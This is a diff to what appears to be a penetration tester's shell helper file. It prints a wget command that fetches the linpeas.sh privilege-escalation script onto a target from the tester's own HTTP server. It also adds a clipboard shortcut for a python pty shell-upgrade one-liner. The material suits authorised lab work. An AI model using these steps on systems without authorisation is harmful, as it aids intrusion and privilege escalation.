@@ -6,17 +6,21 @@ ips() {
 linpeas() {
   ip_tun0=$(ip a show tun0 | awk '/inet / { split($2, a, "/"); print a[1] }')
 
-  echo "Paste it on the target machine: wget http://$ip_tun0/linpeas.sh"
+  echo "Run the following command on the target machine: wget http://$ip_tun0/linpeas.sh"
   cd ~/; python3 -m http.server 80
+}
+
+upgrade () {
+  echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")';python -c 'import pty;pty.spawn(\"/bin/bash\")'"| xclip -sel clip
+}
+
+set_target(){
+  echo "$1" > ~/.config/bin/target
 }
 
 alias tun0="ifconfig tun0 | grep 'inet ' | cut -d' ' -f10 | tr -d '\n' | xclip -sel clip"
 
 alias server="sudo python3 -m http.server 80"
-
-set_target(){
-  echo "$1" > ~/.config/bin/target
-}
 
 alias target="cat ~/.config/bin/target | tr -d '\n' | xclip -sel clip"
 
